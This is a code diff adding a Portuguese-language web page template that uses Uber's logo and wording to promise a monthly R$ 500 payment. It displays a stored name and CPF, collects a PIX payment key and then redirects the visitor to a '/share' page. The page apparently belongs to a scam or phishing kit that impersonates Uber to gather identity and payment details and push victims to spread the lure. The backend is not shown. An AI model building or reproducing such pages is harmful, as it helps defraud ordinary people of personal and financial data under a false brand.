@@ -1,0 +1,341 @@
+{% extends "layout.html" %}
+
+{% block extra_head %}
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+#uber-check, #pix-check {
+    border-radius: 50% !important;
+    width: 12px !important;
+    height: 12px !important;
+    background-color: #000000 !important;
+    display: none !important;
+    box-sizing: border-box !important;
+    flex-shrink: 0 !important;
+}
+#uber-check.show, #pix-check.show {
+    display: block !important;
+}
+
+/* Custom select styling */
+.custom-select {
+    position: relative;
+    width: 100%;
+}
+
+.custom-select select {
+    appearance: none;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    background: white;
+    border: 1px solid #d1d5db;
+    padding: 12px 16px;
+    width: 100%;
+    border-radius: 0px;
+    font-size: 16px;
+    color: #000;
+    cursor: pointer;
+    outline: none;
+    transition: border-color 0.2s;
+}
+
+.custom-select select:focus {
+    border-color: #000 !important;
+    box-shadow: none !important;
+    outline: none !important;
+}
+
+.custom-select::after {
+    content: '▼';
+    position: absolute;
+    top: 50%;
+    right: 12px;
+    transform: translateY(-50%);
+    pointer-events: none;
+    color: #666;
+    font-size: 12px;
+}
+
+/* Remove blue focus from inputs */
+input[type="text"], input[type="email"], input[type="tel"], select {
+    outline: none !important;
+    box-shadow: none !important;
+}
+
+input[type="text"]:focus, input[type="email"]:focus, input[type="tel"]:focus, select:focus {
+    border-color: #000 !important;
+    box-shadow: none !important;
+    outline: none !important;
+}
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="max-w-lg mx-auto px-4 py-8">
+    <!-- Header -->
+    <div class="text-center mb-8">
+        <h1 class="text-2xl font-bold text-black mb-2">Como deseja receber?</h1>
+        <p class="text-gray-600">Escolha a forma de recebimento do seu pagamento mensal de R$ 500,00</p>
+    </div>
+
+    <!-- Payment Options -->
+    <div class="space-y-4 mb-8">
+        <!-- Uber Account Option -->
+        <div id="uber-option" class="bg-white border-2 border-gray-200 p-6 cursor-pointer hover:border-black transition-colors" style="border-radius: 0px;" onclick="selectUberAccount()">
+            <div class="flex items-center space-x-4">
+                <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/26/20/04/262004f7-0886-3241-d236-ed5b181120df/AppIcon-0-0-1x_U007emarketing-0-8-0-0-85-220.png/1200x600wa.png" 
+                     alt="Uber" class="w-20 h-20 object-contain rounded-lg">
+                <div class="flex-1">
+                    <h3 class="text-base font-semibold text-black mb-1">Conta Uber</h3>
+                    <p class="text-xs font-bold text-gray-600" id="user-info">Carregando...</p>
+                    <p class="text-xs text-gray-500 mt-1">Receba diretamente na sua carteira Uber</p>
+                </div>
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full flex items-center justify-center">
+                    <div id="uber-check"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PIX Option -->
+        <div id="pix-option" class="bg-white border-2 border-gray-200 p-6 cursor-pointer hover:border-black transition-colors" style="border-radius: 0px;" onclick="selectPix()">
+            <div class="flex items-center space-x-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg/2560px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg.png" 
+                     alt="PIX" class="w-20 h-20 object-contain">
+                <div class="flex-1">
+                    <h3 class="text-base font-semibold text-black mb-1">PIX</h3>
+                    <p class="text-xs text-gray-600">Transferência instantânea</p>
+                    <p class="text-xs text-gray-500 mt-1">Receba via chave PIX</p>
+                </div>
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full flex items-center justify-center">
+                    <div id="pix-check"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PIX Details (Hidden by default) -->
+    <div id="pix-details" class="hidden mb-8">
+        <div class="p-6" style="background-color: #EEEEEE; border-radius: 0px;">
+            <h3 class="text-lg font-semibold text-black mb-4">Dados PIX</h3>
+            
+            <!-- PIX Key Type Selector -->
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-black mb-2">Tipo de Chave PIX</label>
+                <div class="custom-select">
+                    <select id="pix-type">
+                        <option value="">Selecione o tipo de chave</option>
+                        <option value="email">E-mail</option>
+                        <option value="cpf">CPF</option>
+                        <option value="telefone">Telefone</option>
+                        <option value="aleatoria">Chave Aleatória</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- PIX Key Input -->
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-black mb-2" id="pix-key-label">Chave PIX</label>
+                <input type="text" id="pix-key" 
+                       class="w-full px-4 py-3 border border-gray-300" 
+                       style="border-radius: 0px;"
+                       placeholder="Digite sua chave PIX">
+            </div>
+        </div>
+    </div>
+
+    <!-- Continue Button -->
+    <div class="text-center">
+        <button id="continue-btn" onclick="goDirectToAddress()"
+            class="uber-btn" style="background: #ccc !important; color: #666 !important; border-radius: 2px !important; padding: 12px 24px; border: none; font-weight: 700; width: 100%;" disabled>
+            <i class="fa fa-arrow-right mr-2"></i>Continuar
+        </button>
+    </div>
+</div>
+
+<script>
+let selectedPayment = null;
+
+// Load user data from localStorage
+document.addEventListener('DOMContentLoaded', function() {
+    const userData = JSON.parse(localStorage.getItem('candidateData') || '{}');
+    const userInfoEl = document.getElementById('user-info');
+    
+    console.log('Dados recuperados do localStorage:', userData);
+    
+    if (userData.name && userData.cpf) {
+        // Formatar CPF para exibição
+        const cpfFormatted = userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.***.**$4');
+        userInfoEl.textContent = `${userData.name} - CPF: ${cpfFormatted}`;
+    } else {
+        userInfoEl.textContent = 'Dados não encontrados';
+        console.log('Dados não encontrados no localStorage');
+    }
+});
+
+function selectUberAccount() {
+    selectedPayment = 'uber';
+    updateSelection();
+    document.getElementById('pix-details').classList.add('hidden');
+    enableContinueButton();
+}
+
+function selectPix() {
+    selectedPayment = 'pix';
+    updateSelection();
+    document.getElementById('pix-details').classList.remove('hidden');
+    checkPixForm();
+}
+
+function updateSelection() {
+    // Reset all selections
+    document.getElementById('uber-option').classList.remove('border-black');
+    document.getElementById('pix-option').classList.remove('border-black');
+    document.getElementById('uber-check').classList.remove('show');
+    document.getElementById('pix-check').classList.remove('show');
+    
+    // Highlight selected option
+    if (selectedPayment === 'uber') {
+        document.getElementById('uber-option').classList.add('border-black');
+        document.getElementById('uber-check').classList.add('show');
+    } else if (selectedPayment === 'pix') {
+        document.getElementById('pix-option').classList.add('border-black');
+        document.getElementById('pix-check').classList.add('show');
+    }
+}
+
+// PIX form handling
+document.getElementById('pix-type').addEventListener('change', function() {
+    const pixType = this.value;
+    const pixKeyInput = document.getElementById('pix-key');
+    const pixKeyLabel = document.getElementById('pix-key-label');
+    
+    // Clear current value when changing type
+    pixKeyInput.value = '';
+    
+    switch(pixType) {
+        case 'email':
+            pixKeyLabel.textContent = 'E-mail';
+            pixKeyInput.placeholder = 'exemplo@email.com';
+            pixKeyInput.type = 'email';
+            break;
+        case 'cpf':
+            pixKeyLabel.textContent = 'CPF';
+            pixKeyInput.placeholder = '000.000.000-00';
+            pixKeyInput.type = 'text';
+            break;
+        case 'telefone':
+            pixKeyLabel.textContent = 'Telefone';
+            pixKeyInput.placeholder = '(11) 99999-9999';
+            pixKeyInput.type = 'tel';
+            break;
+        case 'aleatoria':
+            pixKeyLabel.textContent = 'Chave Aleatória';
+            pixKeyInput.placeholder = 'Cole sua chave aleatória aqui';
+            pixKeyInput.type = 'text';
+            break;
+        default:
+            pixKeyLabel.textContent = 'Chave PIX';
+            pixKeyInput.placeholder = 'Digite sua chave PIX';
+            pixKeyInput.type = 'text';
+    }
+    
+    checkPixForm();
+});
+
+// Add formatting to PIX key input
+document.getElementById('pix-key').addEventListener('input', function() {
+    const pixType = document.getElementById('pix-type').value;
+    let value = this.value.replace(/\D/g, ''); // Remove non-digits for CPF and phone
+    
+    switch(pixType) {
+        case 'cpf':
+            // Format CPF: 000.000.000-00
+            if (value.length <= 11) {
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+                this.value = value;
+            }
+            break;
+        case 'telefone':
+            // Format phone: (11) 99999-9999
+            if (value.length <= 11) {
+                if (value.length <= 2) {
+                    this.value = value.replace(/(\d{2})/, '($1');
+                } else if (value.length <= 7) {
+                    this.value = value.replace(/(\d{2})(\d{1,5})/, '($1) $2');
+                } else {
+                    this.value = value.replace(/(\d{2})(\d{5})(\d{1,4})/, '($1) $2-$3');
+                }
+            }
+            break;
+        case 'email':
+            // No formatting needed for email, just keep original value
+            break;
+        case 'aleatoria':
+            // No formatting needed for random key
+            break;
+    }
+    
+    checkPixForm();
+});
+
+document.getElementById('pix-key').addEventListener('input', checkPixForm);
+
+function checkPixForm() {
+    if (selectedPayment === 'pix') {
+        const pixType = document.getElementById('pix-type').value;
+        const pixKey = document.getElementById('pix-key').value.trim();
+        
+        if (pixType && pixKey) {
+            enableContinueButton();
+        } else {
+            disableContinueButton();
+        }
+    }
+}
+
+function enableContinueButton() {
+    const btn = document.getElementById('continue-btn');
+    btn.disabled = false;
+    btn.style.background = '#000 !important';
+    btn.style.color = '#fff !important';
+    btn.removeAttribute('data-processing');
+}
+
+function disableContinueButton() {
+    const btn = document.getElementById('continue-btn');
+    btn.disabled = true;
+    btn.style.background = '#ccc !important';
+    btn.style.color = '#666 !important';
+}
+
+function goDirectToAddress() {
+    if (!selectedPayment) {
+        alert('Por favor, selecione uma forma de pagamento.');
+        return;
+    }
+    
+    // Prevent multiple clicks
+    const btn = document.getElementById('continue-btn');
+    if (btn.hasAttribute('data-processing')) return;
+    btn.setAttribute('data-processing', 'true');
+    
+    // Save payment method to localStorage immediately
+    const paymentData = {
+        method: selectedPayment,
+        timestamp: new Date().toISOString()
+    };
+    
+    if (selectedPayment === 'pix') {
+        paymentData.pixType = document.getElementById('pix-type').value;
+        paymentData.pixKey = document.getElementById('pix-key').value;
+    }
+    
+    localStorage.setItem('paymentMethod', JSON.stringify(paymentData));
+    console.log('Payment method saved:', paymentData);
+    
+    // Immediate direct redirect - no loading screens
+    location.href = '/share';
+}
+</script>
+{% endblock %}
